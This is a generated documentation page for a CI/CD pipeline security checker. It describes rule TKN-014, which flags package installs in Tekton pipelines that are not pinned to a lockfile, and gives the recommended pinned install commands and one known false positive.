**Recommendation.** Pin every package install to a lockfile or a checksum-verified version. ``npm ci`` (not ``npm install``), ``yarn install --frozen-lockfile``, ``pip install -r requirements.txt --require-hashes``, ``bundle install --frozen``. Don't use ``--trusted-host`` / ``--no-verify`` / a non-HTTPS index URL — those bypass TLS or trust validation entirely (TKN-008 covers the TLS subset; this rule covers the lockfile subset).

**Known false positives.**

- Bootstrap-stage installs that intentionally pull latest (``apt-get install -y curl`` for a tooling image rebuild) sometimes legitimately bypass the lockfile. Suppress via ignore-file scoped to the specific step name.

**Source:** [`TKN-014`](../providers/tekton.md#tkn-014) in the [Tekton provider](../providers/tekton.md).

---

_This page is generated. Edit `pipeline_check/core/standards/data/openssf_scorecard.py` (mappings) or `scripts/gen_standards_docs.py` (intro / per-control prose) and run `python scripts/gen_standards_docs.py openssf_scorecard`._
